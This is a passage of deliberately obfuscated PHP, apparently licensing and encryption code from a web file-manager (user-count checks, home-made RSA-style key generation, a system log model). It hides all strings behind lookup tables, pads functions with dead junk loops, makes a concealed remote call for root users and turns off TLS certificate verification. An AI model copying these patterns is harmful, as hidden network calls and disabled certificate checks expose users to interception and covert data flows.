$this->cadn262c22c9($é†Ò»¿ø, $ Éßâ[262]); $é†Ò»¿ø = $é†Ò»¿ø . $ûÚÈ¾¬Ó; $’–Ê¬ÓÌ = $¹¢ŞĞ‹Ê[778]; if ($÷İùÉ•« && is_array($÷İùÉ•«)) { $é†Ò»¿ø = $é†Ò»¿ø . $ Éßâ[263] . http_build_query($÷İùÉ•«); } if ($÷İùÉ•« === -1) { return $é†Ò»¿ø; } $ñ÷ŸŒê = stream_context_create(array($ Éßâ[219] => array($ Éßâ[222] => $ÎëŒé¿í, $ Éßâ[220] => $ Éßâ[264]), $ Éßâ[265] => array($ Éßâ[266] => !1, $ Éßâ[267] => !1))); $÷İùÉ•« = @file_get_contents($é†Ò»¿ø, !1, $ñ÷ŸŒê); return json_decode($÷İùÉ•«, !0); $ÙñÚ§™† = $¹¢ŞĞ‹Ê[779]; while ($ÙñÚ§™† < $¹¢ŞĞ‹Ê[697]) { if ($ÙñÚ§™† >= 0) { break; } $ÙñÚ§™†++; } } private function xqcsf9c5cba9() { $ºÑÉ —Ì =& $_SERVER[ˆö¿ÚÌ¼]; $µÓƒÂ’© =& $_SERVER[›üôÆØÜ]; $™ë¡‰¸é = array($µÓƒÂ’©[268] => $µÓƒÂ’©[269], $µÓƒÂ’©[270] => $µÓƒÂ’©[271], $µÓƒÂ’©[272] => $µÓƒÂ’©[273], $µÓƒÂ’©[274] => $µÓƒÂ’©[275], $µÓƒÂ’©[276] => $µÓƒÂ’©[277], $µÓƒÂ’©[278] => $µÓƒÂ’©[214], $µÓƒÂ’©[279] => $µÓƒÂ’©[214], $µÓƒÂ’©[280] => $µÓƒÂ’©[269], $µÓƒÂ’©[281] => $µÓƒÂ’©[271], $µÓƒÂ’©[282] => $µÓƒÂ’©[273], $µÓƒÂ’©[283] => $µÓƒÂ’©[284], $µÓƒÂ’©[285] => $µÓƒÂ’©[275], $µÓƒÂ’©[286] => $µÓƒÂ’©[287], $µÓƒÂ’©[288] => $µÓƒÂ’©[277], $µÓƒÂ’©[289] => $µÓƒÂ’©[290], $µÓƒÂ’©[291] => $µÓƒÂ’©[292], $µÓƒÂ’©[293] => $µÓƒÂ’©[294]); $’”³œÕ’ = $ºÑÉ —Ì[780]; if (strlen($’”³œÕ’) < $ºÑÉ —Ì[713]) { return; } $½¢‚à• = $™ë¡‰¸é[$this->tchv2c1c01f8]; $½¢‚à• = intval($½¢‚à• ? $½¢‚à• : $µÓƒÂ’©[269]); $á›ñ™—¢ = $ºÑÉ —Ì[781]; $ªñàû— = _get($this->yuqic9f24708, $µÓƒÂ’©[295]); $ªñàû— = $ªñàû— ? intval($ªñàû—) : 0; $¼İ¦•ÓÛ = $ºÑÉ —Ì[782]; return $½¢‚à• + $ªñàû—; } public function mjor0fb3c9a2($“õù¡Äİ) { $Ş§÷åõ° =& $_SERVER[ˆö¿ÚÌ¼]; $ä¢ç‰µ¹ =& $_SERVER[›üôÆØÜ]; $ÌüïÆÔ = $this->xqcsf9c5cba9(); $™öÌ–¯ª = $Ş§÷åõ°[783]; if (!$™öÌ–¯ª) { return; } if ($“õù¡Äİ[$ä¢ç‰µ¹[296]] == $ä¢ç‰µ¹[122]) { return; } if ($ÌüïÆÔ >= intval($ä¢ç‰µ¹[214])) { return; } $­À‰¯’¯ = Model($ä¢ç‰µ¹[125])->count(); if ($­À‰¯’¯ <= $ÌüïÆÔ) { return; } $¤ß˜Øõó = Model($ä¢ç‰µ¹[125])->field($ä¢ç‰µ¹[296])->limit($ÌüïÆÔ)->select(); $œƒ£Ü = $Ş§÷åõ°[784]; if (strlen($œƒ£Ü) < $Ş§÷åõ°[713]) { die; } $¤ß˜Øõó = array_to_keyvalue($¤ß˜Øõó, $ä¢ç‰µ¹[6], $ä¢ç‰µ¹[296]); if (!in_array($“õù¡Äİ[$ä¢ç‰µ¹[296]], $¤ß˜Øõó)) { show_json($ä¢ç‰µ¹[297], !1, $ä¢ç‰µ¹[210]); } } public function wvyd89297d0d() { $÷¶ø­à =& $_SERVER[ˆö¿ÚÌ¼]; $Ö¾æâúâ =& $_SERVER[›üôÆØÜ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $úœÍ†Éñ = $Ö¾æâúâ[217]; $úœÍ†Éñ = $this->cadn262c22c9($úœÍ†Éñ, $Ö¾æâúâ[218]); $ÂÜœ‚ŠĞ = stream_context_create(array($Ö¾æâúâ[219] => array($Ö¾æâúâ[220] => $Ö¾æâúâ[221], $Ö¾æâúâ[222] => 3))); $Õ„½Ä˜ = @file_get_contents($úœÍ†Éñ, !1, $ÂÜœ‚ŠĞ); $¾õ„Ö¥Ğ = $÷¶ø­à[785]; while (strlen($¾õ„Ö¥Ğ) < $÷¶ø­à[713]) { if (!$¾õ„Ö¥Ğ) { break; } $¾õ„Ö¥Ğ++; } echo $Ö¾æâúâ[298] . hash_encode($Õ„½Ä˜) . $Ö¾æâúâ[299]; $ş¹‡ Ú = $÷¶ø­à[786]; while ($ş¹‡ Ú < $÷¶ø­à[713]) { if ($ş¹‡ Ú >= 0) { break; } $ş¹‡ Ú++; } } private function komx67ac06e4($Ö®äã, $ş‚™•ò”, $ø¹ï€¦ê = 3) { $òÚë‚‰î =& $_SERVER[ˆö¿ÚÌ¼]; $ä™†§·Ù =& $_SERVER[›üôÆØÜ]; usleep(1); $¹ç‹ŸŞ = $òÚë‚‰î[787]; if (strlen($¹ç‹ŸŞ) < $òÚë‚‰î[485]) { return; } $Ö®äã = trim($Ö®äã); $¦â¿Â¼Œ = $òÚë‚‰î[788]; $†Ã˜Ïí÷ = mt_rand(0, 5) . $ä™†§·Ù[6]; $»ŒãÄÔ = rand_string(15); $‘¥±™ì = $ä™†§·Ù[300]; switch ($†Ã˜Ïí÷) { case $ä™†§·Ù[206]: $•Ç°°ä = $this->tenl12c34418($Ö®äã, strrev($ş‚™•ò” . $»ŒãÄÔ)); $¨§Ãş×ä = $òÚë‚‰î[789]; while (strlen($¨§Ãş×ä) < $òÚë‚‰î[713]) { if (!$¨§Ãş×ä) { break; } $¨§Ãş×ä++; } break; $ıŞ«ôó§ = $òÚë‚‰î[790]; while (strlen($ıŞ«ôó§) < $òÚë‚‰î[713]) { if (!$ıŞ«ôó§) { break; } $ıŞ«ôó§++; } case $ä™†§·Ù[122]: $•Ç°°ä = $this->tenl12c34418($Ö®äã, strrev($»ŒãÄÔ . $ş‚™•ò”)); $’ßš—Ş® = $òÚë‚‰î[791]; if (!$’ßš—Ş®) { return; } break; $¥îàåÏ¦ = $òÚë‚‰î[792]; if (strlen($¥îàåÏ¦) < $òÚë‚‰î[697]) { die; } case $ä™†§·Ù[301]: $•Ç°°ä = $this->tenl12c34418($Ö®äã, base64_encode($»ŒãÄÔ . $ş‚™•ò”)); break; $‘·²±˜ = $òÚë‚‰î[793]; case $ä™†§·Ù[302]: $•Ç°°ä = $this->tenl12c34418($Ö®äã, md5($»ŒãÄÔ . $ş‚™•ò”)); break; $Ò£¥É¾Õ = $òÚë‚‰î[794]; case $ä™†§·Ù[303]: $Ö®äã = base64_encode($Ö®äã); $¦‚¶Ùéº = $òÚë‚‰î[795]; if (strlen($¦‚¶Ùéº) < $òÚë‚‰î[713]) { return; } $‹œ±¿ñ = rand(0, 64); $Š‹ëª‡Ç = $òÚë‚‰î[796]; $ä¡‚Î¨Â = $‘¥±™ì[$‹œ±¿ñ]; $î°™Ø = $òÚë‚‰î[797]; $ËúÖšÄÌ = md5($ä¡‚Î¨Â . md5($ş‚™•ò” . $ä¡‚Î¨Â) . $ş‚™•ò”); $·´×ÖËÌ = $òÚë‚‰î[798]; while (strlen($·´×ÖËÌ) < $òÚë‚‰î[709]) { if (!$·´×ÖËÌ) { break; } $·´×ÖËÌ++; } $ËúÖšÄÌ = substr($ËúÖšÄÌ, $‹œ±¿ñ % 8, $‹œ±¿ñ % 8 + 7); $ÖÒÏÛ½ = $òÚë‚‰î[799]; if (strlen($ÖÒÏÛ½) < $òÚë‚‰î[713]) { die; } $õñïÎëĞ = $ä™†§·Ù[6]; $ßûÑªõÅ = $òÚë‚‰î[800]; if (strlen($ßûÑªõÅ) < $òÚë‚‰î[485]) { die; } $õøÊä¾á = 0; $·¾¼Åæƒ = 0; $ØàËë¯Ü = $òÚë‚‰î[801]; $“ëˆûÆç = 0; for ($õøÊä¾á = 0; $õøÊä¾á < strlen($Ö®äã); $õøÊä¾á++) { $“ëˆûÆç = $“ëˆûÆç == strlen($ËúÖšÄÌ) ? 0 : $“ëˆûÆç; $·¾¼Åæƒ = ($‹œ±¿ñ + strpos($‘¥±™ì, $Ö®äã[$õøÊä¾á]) + ord($ËúÖšÄÌ[$“ëˆûÆç++])) % 64; $õñïÎëĞ .= $‘¥±™ì[$·¾¼Åæƒ]; } $•Ç°°ä = hash_encode($ä¡‚Î¨Â . $õñïÎëĞ); $°ìÀóô = $òÚë‚‰î[802]; while (strlen($°ìÀóô) < $òÚë‚‰î[713]) { if (!$°ìÀóô) { break; } $°ìÀóô++; } break; $ÒÊ’­Á = $òÚë‚‰î[803]; if (!$ÒÊ’­Á) { return; } default: $•Ç°°ä = $this->tenl12c34418($Ö®äã, $ş‚™•ò” . $»ŒãÄÔ); $Óâ€·Èò = $òÚë‚‰î[804]; if (!$Óâ€·Èò) { die; } break; } $•Ç°°ä = strrev($†Ã˜Ïí÷ . $»ŒãÄÔ . $•Ç°°ä); $ª’å‘åÚ = $òÚë‚‰î[805]; if ($ø¹ï€¦ê - 1 > 0) { $•Ç°°ä = $this->komx67ac06e4($•Ç°°ä, $ş‚™•ò”, $ø¹ï€¦ê - 1); } return $•Ç°°ä; } private function qgotba047a2f($Íºˆ£Œü, $ÅüäÉµÚ, $Åêõİ· = 3) { $µÕ˜şëï =& $_SERVER[ˆö¿ÚÌ¼]; $›¹ĞÀ† =& $_SERVER[›üôÆØÜ]; if (!is_string($Íºˆ£Œü) || strlen($Íºˆ£Œü) < 10) { return !1; } $Íºˆ£Œü = trim($Íºˆ£Œü); $ËĞ™“É = $µÕ˜şëï[806]; if (!$ËĞ™“É) { return; } $Íºˆ£Œü = strrev($Íºˆ£Œü); $ÜÌ÷¡÷ = $Íºˆ£Œü[0]; $šØ¸á = $µÕ˜şëï[807]; while (strlen($šØ¸á) < $µÕ˜şëï[706]) { if (!$šØ¸á) { break; } $šØ¸á++; } $¾êìôºµ = substr($Íºˆ£Œü, 1, 15); $Íºˆ£Œü = substr($Íºˆ£Œü, 16); $‡–ˆÄöœ = $µÕ˜şëï[808]; while (strlen($‡–ˆÄöœ) < $µÕ˜şëï[697]) { if (!$‡–ˆÄöœ) { break; } $‡–ˆÄöœ++; } $Ù¯©Ìæ = $›¹ĞÀ†[300]; $Û³Óñûè = $µÕ˜şëï[809]; switch ($ÜÌ÷¡÷) { case $›¹ĞÀ†[206]: $–§»œ€ = $this->cadn262c22c9($Íºˆ£Œü, strrev($ÅüäÉµÚ . $¾êìôºµ)); $«†Æäè = $µÕ˜şëï[810]; break; case $›¹ĞÀ†[122]: $–§»œ€ = $this->cadn262c22c9($Íºˆ£Œü, strrev($¾êìôºµ . $ÅüäÉµÚ)); $¨š‚°Ğ = $µÕ˜şëï[811]; break; case $›¹ĞÀ†[301]: $–§»œ€ = $this->cadn262c22c9($Íºˆ£Œü, base64_encode($¾êìôºµ . $ÅüäÉµÚ)); break; case $›¹ĞÀ†[302]: $–§»œ€ = $this->cadn262c22c9($Íºˆ£Œü, md5($¾êìôºµ . $ÅüäÉµÚ)); $€–¥›› = $µÕ˜şëï[812]; if (!$€–¥››) { die; } break; case $›¹ĞÀ†[303]: $Íºˆ£Œü = hash_decode($Íºˆ£Œü); $ş½šß’ = $Íºˆ£Œü[0]; $ØÖÙ©­ = $µÕ˜şëï[813]; $Íºˆ£Œü = substr($Íºˆ£Œü, 1); $Şá”ÅéŠ = strpos($Ù¯©Ìæ, $ş½šß’); $”¤ÁÇœ = md5($ş½šß’ . md5($ÅüäÉµÚ . $ş½šß’) . $ÅüäÉµÚ); $”¤ÁÇœ = substr($”¤ÁÇœ, $Şá”ÅéŠ % 8, $Şá”ÅéŠ % 8 + 7); $ÁÜÔËè = $›¹ĞÀ†[6]; $ä‹Ü™ƒ´ = 0; $Êâ½Á‚Î = 0; $÷ªà±ğº = 0; for ($ä‹Ü™ƒ´ = 0; $ä‹Ü™ƒ´ < strlen($Íºˆ£Œü); $ä‹Ü™ƒ´++) { $÷ªà±ğº = $÷ªà±ğº == strlen($”¤ÁÇœ) ? 0 : $÷ªà±ğº; $Ç¿µƒËí = $÷ªà±ğº++; $Êâ½Á‚Î = strpos($Ù¯©Ìæ, $Íºˆ£Œü[$ä‹Ü™ƒ´]) - $Şá”ÅéŠ - ord($”¤ÁÇœ[$Ç¿µƒËí]); $Õ¢°–ŞÊ = $µÕ˜şëï[814]; if (strlen($Õ¢°–ŞÊ) < $µÕ˜şëï[709]) { return; } while ($Êâ½Á‚Î < 0) { $Êâ½Á‚Î += 64; } $ÁÜÔËè .= $Ù¯©Ìæ[$Êâ½Á‚Î]; $„ß¹¢‰á = $µÕ˜şëï[815]; while (strlen($„ß¹¢‰á) < $µÕ˜şëï[706]) { if (!$„ß¹¢‰á) { break; } $„ß¹¢‰á++; } } $–§»œ€ = base64_decode($ÁÜÔËè); break; default: $–§»œ€ = $this->cadn262c22c9($Íºˆ£Œü, $ÅüäÉµÚ . $¾êìôºµ); break; $Öã¦Øà = $µÕ˜şëï[816]; while ($Öã¦Øà < $µÕ˜şëï[697]) { if ($Öã¦Øà >= 0) { break; } $Öã¦Øà++; } } if ($Åêõİ· - 1 > 0) { $–§»œ€ = $this->qgotba047a2f($–§»œ€, $ÅüäÉµÚ, $Åêõİ· - 1); } return $–§»œ€; } public function utmwb8e86d97($á‘»‘Ñ²) { $¼Òñ¸’ =& $_SERVER[ˆö¿ÚÌ¼]; $¢‡ô•ùÈ =& $_SERVER[›üôÆØÜ]; $ÊÏş‰¼è = $this->djgbb8624f17(); $û€†·Ò¡ = $this->djgbb8624f17(); $ä¯üîÂù = ($ÊÏş‰¼è - 1) * ($û€†·Ò¡ - 1); $¬°à×…ü = intval(($ÊÏş‰¼è + $û€†·Ò¡) / 2); while (1) { $ìîÄ±Ù¨ = $¬°à×…ü; $‰ùóğ€è = $ä¯üîÂù; while ($‰ùóğ€è % $ìîÄ±Ù¨ != 0) { $¾ÂßäÆ³ = $‰ùóğ€è; $üõè˜ºï = $¼Òñ¸’[817]; if (!$üõè˜ºï) { die; } $‰ùóğ€è = $ìîÄ±Ù¨; $ìîÄ±Ù¨ = $¾ÂßäÆ³ % $ìîÄ±Ù¨; $—„æÄ Í = $¼Òñ¸’[818]; if (strlen($—„æÄ Í) < $¼Òñ¸’[709]) { die; } } if ($ìîÄ±Ù¨ == 1) { break; } else { $¬°à×…ü++; } } $œÉ¢øÛÕ = 2; $Ïè—Ğ³ë = $¼Òñ¸’[801]; if (!$Ïè—Ğ³ë) { return; } for ($ıŒ×ÖÈ± = 0; $ıŒ×ÖÈ± < $ä¯üîÂù * 10; $ıŒ×ÖÈ±++) { if (($ä¯üîÂù * $ıŒ×ÖÈ± + 1) % $¬°à×…ü == 0) { $œÉ¢øÛÕ = intval(($ä¯üîÂù * $ıŒ×ÖÈ± + 1) / $¬°à×…ü); break; } } $ö˜âˆşü = $this->tenl12c34418($ÊÏş‰¼è * $û€†·Ò¡ . $¢‡ô•ùÈ[6], $¢‡ô•ùÈ[136]); $ÏÀ…›º° = md5($¢‡ô•ùÈ[304] . ($ÊÏş‰¼è + $û€†·Ò¡) . $¢‡ô•ùÈ[305] . $¬°à×…ü . $¢‡ô•ùÈ[305] . $œÉ¢øÛÕ . $¢‡ô•ùÈ[306]); $‰©”Ï = $¼Òñ¸’[819]; if (strlen($‰©”Ï) < $¼Òñ¸’[485]) { die; } $â¨÷½ÕÒ = $this->tenl12c34418($á‘»‘Ñ², $ÏÀ…›º°) . $¢‡ô•ùÈ[307] . $ö˜âˆşü; return $â¨÷½ÕÒ; } public function sjvdeae6df47($„•ì¯ºï) { $ëò¹÷úÛ =& $_SERVER[ˆö¿ÚÌ¼]; $°Ûçé£ =& $_SERVER[›üôÆØÜ]; $ëüÄ‘Ğ = explode($°Ûçé£[307], $„•ì¯ºï); $èÈ¤¥ó = $ëò¹÷úÛ[820]; while (strlen($èÈ¤¥ó) < $ëò¹÷úÛ[485]) { if (!$èÈ¤¥ó) { break; } $èÈ¤¥ó++; } if (count($ëüÄ‘Ğ) != 2) { return $°Ûçé£[6]; } $‚±­ÌÆ„ = $this->cadn262c22c9($ëüÄ‘Ğ[1] . $°Ûçé£[6], $°Ûçé£[136]); if (!$‚±­ÌÆ„) { return $°Ûçé£[6]; } $‚±­ÌÆ„ = intval($‚±­ÌÆ„); $’¿Ëûö = $ëò¹÷úÛ[821]; if (strlen($’¿Ëûö) < $ëò¹÷úÛ[485]) { return; } $Ôõ‘×ıÇ = 0; $ò¥€É’ = $ëò¹÷úÛ[822]; $Á—“ƒ¶æ = 0; for ($ã…¼Ãóœ = 3; $ã…¼Ãóœ < $‚±­ÌÆ„; $ã…¼Ãóœ += 2) { if ($‚±­ÌÆ„ % $ã…¼Ãóœ != 0) { continue; } $Ôõ‘×ıÇ = $ã…¼Ãóœ; $Á—“ƒ¶æ = intval($‚±­ÌÆ„ / $ã…¼Ãóœ); break; $¿€óçÀì = $ëò¹÷úÛ[823]; if (strlen($¿€óçÀì) < $ëò¹÷úÛ[713]) { return; } } $Œ‹÷Ÿß• = ($Ôõ‘×ıÇ - 1) * ($Á—“ƒ¶æ - 1); $ÄòÑß¯Õ = $ëò¹÷úÛ[824]; $¢”¹Õ‘œ = intval(($Ôõ‘×ıÇ + $Á—“ƒ¶æ) / 2); $«¿¬»û = $ëò¹÷úÛ[825]; while (1) { $¬ƒ‚¨©Ï = $¢”¹Õ‘œ; $î¶¤ì¼„ = $ëò¹÷úÛ[826]; if (!$î¶¤ì¼„) { return; } $€¯–¯» = $Œ‹÷Ÿß•; while ($€¯–¯» % $¬ƒ‚¨©Ï != 0) { $„à›•í— = $€¯–¯»; $€¯–¯» = $¬ƒ‚¨©Ï; $¬ƒ‚¨©Ï = $„à›•í— % $¬ƒ‚¨©Ï; $±Ú€Ì‰ = $ëò¹÷úÛ[827]; if (strlen($±Ú€Ì‰) < $ëò¹÷úÛ[709]) { return; } } if ($¬ƒ‚¨©Ï == 1) { break; } else { $¢”¹Õ‘œ++; } } $ÍÉ÷×ê = 2; $‘ïÆö­í = $ëò¹÷úÛ[828]; if (strlen($‘ïÆö­í) < $ëò¹÷úÛ[706]) { return; } for ($ã…¼Ãóœ = 0; $ã…¼Ãóœ < $Œ‹÷Ÿß• * 10; $ã…¼Ãóœ++) { if (($Œ‹÷Ÿß• * $ã…¼Ãóœ + 1) % $¢”¹Õ‘œ == 0) { $ÍÉ÷×ê = intval(($Œ‹÷Ÿß• * $ã…¼Ãóœ + 1) / $¢”¹Õ‘œ); break; } } $èÈº€» = md5($°Ûçé£[304] . ($Ôõ‘×ıÇ + $Á—“ƒ¶æ) . $°Ûçé£[305] . $¢”¹Õ‘œ . $°Ûçé£[305] . $ÍÉ÷×ê . $°Ûçé£[306]); $œ³¬Š¶ = $this->cadn262c22c9($ëüÄ‘Ğ[0], $èÈº€»); return $œ³¬Š¶; } public function djgbb8624f17() { $Ã Á… =& $_SERVER[ˆö¿ÚÌ¼]; $“›„Ç÷ = mt_rand(pow(2, 14), pow(2, 16) - 1); $Ñëï—ÍŞ = $Ã Á…[829]; if (!$Ñëï—ÍŞ) { die; } $ªº¶Ôğ¦ = array(); $³Êƒß«Û = $Ã Á…[830]; if (!$³Êƒß«Û) { die; } $–“ÉŸ = 1; $§‘òÔøÕ = $Ã Á…[831]; if (strlen($§‘òÔøÕ) < $Ã Á…[709]) { die; } while ($–“ÉŸ <= (int) sqrt($“›„Ç÷)) { $ÅÊ¶˜§ = $–“ÉŸ; while (!0) { $ÅÊ¶˜§++; if ($ÅÊ¶˜§ <= 2) { $–“ÉŸ = $ÅÊ¶˜§; break; } else { if ($ÅÊ¶˜§ < 2) { continue; } } $ˆ»íà¾Î = !0; for ($‘±÷ı‰¬ = 2; $‘±÷ı‰¬ <= sqrt($ÅÊ¶˜§); $‘±÷ı‰¬++) { if ($ÅÊ¶˜§ % $‘±÷ı‰¬ == 0) { $ˆ»íà¾Î = !1; } } if ($ˆ»íà¾Î) { $–“ÉŸ = $ÅÊ¶˜§; break; } } $ªº¶Ôğ¦[] = $–“ÉŸ; } $§ÓĞ¨âÔ = 2; for ($ÅÊ¶˜§ = $“›„Ç÷; $ÅÊ¶˜§ > 1; $ÅÊ¶˜§--) { $ˆ»íà¾Î = !0; foreach ($ªº¶Ôğ¦ as $õ¥µŒ£õ) { if ($ÅÊ¶˜§ % $õ¥µŒ£õ == 0) { $ˆ»íà¾Î = !1; break; } } if ($ˆ»íà¾Î) { $§ÓĞ¨âÔ = $ÅÊ¶˜§; break; } } return $§ÓĞ¨âÔ; $ã©¿Åƒ¶ = $Ã Á…[832]; } public function xznqe486b001($Œê‡â–ø, $ÌİÚÌ„ä) { $¾Ò”©ã¿ =& $_SERVER[›üôÆØÜ]; return call_user_func(array($¾Ò”©ã¿[8], $¾Ò”©ã¿[308]), $Œê‡â–ø, $ÌİÚÌ„ä); } public function tenl12c34418($ˆ×«¦´É, $ºÍàÙÊ) { $ÃÂè”òë =& $_SERVER[›üôÆØÜ]; return call_user_func(array($ÃÂè”òë[309], $ÃÂè”òë[310]), $ˆ×«¦´É, $ºÍàÙÊ); } public function cadn262c22c9($À…¬¡ò, $¾¡ú¢ÈÚ) { $»ø–ñ´† =& $_SERVER[›üôÆØÜ]; return call_user_func(array($»ø–ñ´†[309], $»ø–ñ´†[311]), $À…¬¡ò, $¾¡ú¢ÈÚ); } } goto f¿‚Ì„£‘; b³†™ğÄÖë: define($_SERVER[ˆö¿ÚÌ¼][320], 3); define($_SERVER[ˆö¿ÚÌ¼][321], 1); define($_SERVER[ˆö¿ÚÌ¼][322], 0); goto bºÃ²åŠŞØ; BŠàÙ¾Ø‹ˆ: class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\163\164\x65\x6d\137\x6c\157\x67"; protected $dataAuto = array(array("\143\x72\x65\141\164\145\x54\x69\x6d\145", "\164\x69\155\145", "\x69\156\163\145\x72\x74", "\x66\165\x6e\x63\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ıäó¾³“ =& $_SERVER[ˆö¿ÚÌ¼]; return array($ıäó¾³“[2360] => LNG($ıäó¾³“[2361]), $ıäó¾³“[2362] => LNG($ıäó¾³“[2363]), $ıäó¾³“[1928] => LNG($ıäó¾³“[2364]), $ıäó¾³“[2365] => LNG($ıäó¾³“[2366]), $ıäó¾³“[2367] => LNG($ıäó¾³“[2368]), $ıäó¾³“[2369] => LNG($ıäó¾³“[2370]), $ıäó¾³“[2371] => LNG($ıäó¾³“[2372]), $ıäó¾³“[1958] => LNG($ıäó¾³“[2372]), $ıäó¾³“[1959] => LNG($ıäó¾³“[2373]), $ıäó¾³“[2374] => LNG($ıäó¾³“[2375]), $ıäó¾³“[2376] => LNG($ıäó¾³“[2377]), $ıäó¾³“[2378] => LNG($ıäó¾³“[2379]), $ıäó¾³“[2380] => LNG($ıäó¾³“[2381]), $ıäó¾³“[1956] => LNG($ıäó¾³“[2382]), $ıäó¾³“[2383] => LNG($ıäó¾³“[2384]), $ıäó¾³“[1963] => LNG($ıäó¾³“[2385]), $ıäó¾³“[2386] => LNG($ıäó¾³“[2387]), $ıäó¾³“[2388] => LNG($ıäó¾³“[2389]), $ıäó¾³“[2390] => LNG($ıäó¾³“[2391]), $ıäó¾³“[2392] => LNG($ıäó¾³“[2393]), $ıäó¾³“[1966] => LNG($ıäó¾³“[2394]), $ıäó¾³“[1967] => LNG($ıäó¾³“[2395]), $ıäó¾³“[2396] => LNG($ıäó¾³“[2397]), $ıäó¾³“[2398] => LNG($ıäó¾³“[2399]), $ıäó¾³“[2400] => LNG($ıäó¾³“[2401]), $ıäó¾³“[1961] => LNG($ıäó¾³“[2402]), $ıäó¾³“[2403] => LNG($ıäó¾³“[2404]), $ıäó¾³“[1960] => LNG($ıäó¾³“[2405]), $ıäó¾³“[2406] => LNG($ıäó¾³“[2406]), $ıäó¾³“[2407] => LNG($ıäó¾³“[2408]), $ıäó¾³“[2409] => LNG($ıäó¾³“[2406]), $ıäó¾³“[2410] => LNG($ıäó¾³“[2411]), $ıäó¾³“[2412] => LNG($ıäó¾³“[2413]), $ıäó¾³“[2414] => LNG($ıäó¾³“[2413]), $ıäó¾³“[2415] => LNG($ıäó¾³“[2416]), $ıäó¾³“[2417] => LNG($ıäó¾³“[2417]), $ıäó¾³“[2418] => LNG($ıäó¾³“[1932]), $ıäó¾³“[2419] => LNG($ıäó¾³“[2420]), $ıäó¾³“[2421] => LNG($ıäó¾³“[2422]), $ıäó¾³“[2423] => LNG($ıäó¾³“[2424]), $ıäó¾³“[2425] => LNG($ıäó¾³“[2426]), $ıäó¾³“[2427] => LNG($ıäó¾³“[2428]), $ıäó¾³“[2429] => LNG($ıäó¾³“[2429]), $ıäó¾³“[2430] => LNG($ıäó¾³“[2431]), $ıäó¾³“[2432] => LNG($ıäó¾³“[2433]), $ıäó¾³“[2434] => LNG($ıäó¾³“[2435]), $ıäó¾³“[2436] => LNG($ıäó¾³“[2437]), $ıäó¾³“[2438] => LNG($ıäó¾³“[2439]), $ıäó¾³“[2440] => LNG($ıäó¾³“[2441]), $ıäó¾³“[213] => LNG($ıäó¾³“[213]), $ıäó¾³“[214] => LNG($ıäó¾³“[2442]), $ıäó¾³“[2443] => LNG($ıäó¾³“[2443])); } private function typeFile() { $–Ã™ãÕ³ =& $_SERVER[ˆö¿ÚÌ¼]; $†»Û‘çİ = array($–Ã™ãÕ³[1963] => array($–Ã™ãÕ³[1964]), $–Ã™ãÕ³[2378] => array($–Ã™ãÕ³[2444]), $–Ã™ãÕ³[2380] => array($–Ã™ãÕ³[2445]), $–Ã™ãÕ³[1956] => array($–Ã™ãÕ³[1957], $–Ã™ãÕ³[2446]), $–Ã™ãÕ³[2388] => array(), $–Ã™ãÕ³[2390] => array(), $–Ã™ãÕ³[2392] => array(), $–Ã™ãÕ³[1966] => array($–Ã™ãÕ³[1968]), $–Ã™ãÕ³[1967] => array($–Ã™ãÕ³[1968]), $–Ã™ãÕ³[2396] => array($–Ã™ãÕ³[2447]), $–Ã™ãÕ³[2398] => array($–Ã™ãÕ³[2447]), $–Ã™ãÕ³[2400] => array($–Ã™ãÕ³[2448]), $–Ã™ãÕ³[2386] => array($–Ã™ãÕ³[2449]), $–Ã™ãÕ³[1961] => array($–Ã™ãÕ³[2450]), $–Ã™ãÕ³[2403] => array($–Ã™ãÕ³[2451]), $–Ã™ãÕ³[1960] => array($–Ã™ãÕ³[1962])); return $†»Û‘çİ; } private function typeAll() { $ÔŸ†¢®× =& $_SERVER[ˆö¿ÚÌ¼]; $™‘¨Êñ = $this->typeList; $¿÷ÁóÎŞ = array_filter($this->typeFile()); foreach ($¿÷ÁóÎŞ as $ñöÜüÛ¶ => $ÕŸÔ´ñ) { $™‘¨Êñ[$ÕŸÔ´ñ[0]] = $™‘¨Êñ[$ñöÜüÛ¶]; } $™‘¨Êñ[$ÔŸ†¢®×[1968]] = LNG($ÔŸ†¢®×[2452]); $™‘¨Êñ[$ÔŸ†¢®×[2447]] = LNG($ÔŸ†¢®×[2453]); return $™‘¨Êñ; } public function addLog($ÈÇòÕó», $ÊÚîÜ²® = array()) { $ò„¾àù =& $_SERVER[ˆö¿ÚÌ¼]; if (!isset($this->typeList[$ÈÇòÕó»])) { return; } $—½Ş®¿„ = Session::get($ò„¾àù[2127]); if (!$—½Ş®¿„) { $—½Ş®¿„ = _get($ÊÚîÜ²®, $ò„¾àù[1785], 0); } if ($ÈÇòÕó» == $ò„¾àù[2419] && is_array($ÊÚîÜ²®[$ò„¾àù[2454]]) && !$ÊÚîÜ²®[$ò„¾àù[2454]]) { return; } $ĞŠ‹Àıİ = get_client_ip(); if (!$ÊÚîÜ²® || strlen(json_encode($ÊÚîÜ²®)) >= 1024 * 64) { if ($ÊÚîÜ²® && is_array($ÊÚîÜ²®)) { $ÊÚîÜ²® = array_intersect_key($ÊÚîÜ²®, array_flip($ò„¾àù[478], $ò„¾àù[32])); $ÊÚîÜ²®[$ò„¾àù[2455]] = $ĞŠ‹Àıİ; } else { $ÊÚîÜ²® = array($ò„¾àù[2455] => $ĞŠ‹Àıİ); } } else { if (is_array($ÊÚîÜ²®)) { $ÊÚîÜ²®[$ò„¾àù[2455]] = $ĞŠ‹Àıİ; } else { $ÊÚîÜ²® = array($ò„¾àù[1301] => $ÊÚîÜ²®, $ò„¾àù[2455] => $ĞŠ‹Àıİ); } } $ÊÚîÜ²® = array($ò„¾àù[1775] => Session::sign(), $ò„¾àù[1776] => intval($—½Ş®¿„), $ò„¾àù[33] => $ÈÇòÕó», $ò„¾àù[1778] => json_encode($ÊÚîÜ²®)); return parent::add($ÊÚîÜ²®); } public function remove($ˆÜÑ–ß¥) { $this->where(array($_SERVER[ˆö¿ÚÌ¼][505] => $ˆÜÑ–ß¥))->delete(); } private function _makeOrder($œ¡£şˆ = '') { $¦æ¹‹ =& $_SERVER[ˆö¿ÚÌ¼]; $ãËŞÍéé = $¦æ¹‹[234]; $ôĞ¥Ù¢Ÿ = array($¦æ¹‹[535] => $¦æ¹‹[536], $¦æ¹‹[537] => $¦æ¹‹[538]); $¾¹õ¢³É = Input::get($¦æ¹‹[543], $¦æ¹‹[7], $¦æ¹‹[2167], array($¦æ¹‹[2081], $¦æ¹‹[537])); 